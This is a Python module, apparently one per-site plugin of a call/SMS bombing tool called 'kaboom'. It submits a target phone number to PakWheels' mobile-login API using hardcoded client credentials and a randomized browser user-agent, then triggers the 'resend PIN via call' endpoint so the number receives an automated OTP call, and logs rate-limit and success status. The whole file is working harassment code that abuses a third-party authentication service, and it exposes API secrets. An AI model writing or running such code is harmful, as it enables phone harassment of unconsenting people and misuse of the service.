from kaboom.core import *
from kaboom.localuseragent import *


async def pakwheels(phone, client, out):
    name = "pakwheels"
    domain = "pakwheels"
    frequent_rate_limit=False
    
    headers = {
        'user-agent': random.choice(ua["browsers"]["chrome"]),
    }

    params = {
        'client_id': '37952d7752aae22726aff51be531cddd',
        'client_secret': '014a5bc91e1c0f3af4ea6dfaa7eee413',
        'api_version': '18',
    }
    json_data = {
        'mobile_number': f'0{phone[-10:]}',
        'country_code': '92',
    }
    response = await client.post(
        'https://www.pakwheels.com/login-with-mobile.json',
        params=params,
        headers=headers,
        json=json_data,
    )
    data=response.json()
    if data.get('error') and "Please wait for" in data.get("error", ""):
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False, "reason": data.get("error")})
        return None
    pinid=data.get('pin_id')
    if not pinid:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": False, "error": True, "reason": data.get("error") or data.get("message") or "pin_id not returned"})
        return None

    json_data = {
        'pin_id': pinid,
    }

    response = await client.post(
        'https://www.pakwheels.com/login-with-mobile/resend-pin-via-call.json',
        params=params,
        headers=headers,
        json=json_data,
    )
    try:
        data=response.json()
        if "Please wait for" in data.get("error", ""):
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False, "reason": data.get("error")})
            return None
        if data.get("message") == "You will receive an automated call with OTP shortly":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True, "reason": data.get("error") or data.get("message") or "otp call request failed"})
        return None
    except Exception as exc:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True, "reason": str(exc) or type(exc).__name__})
        return None
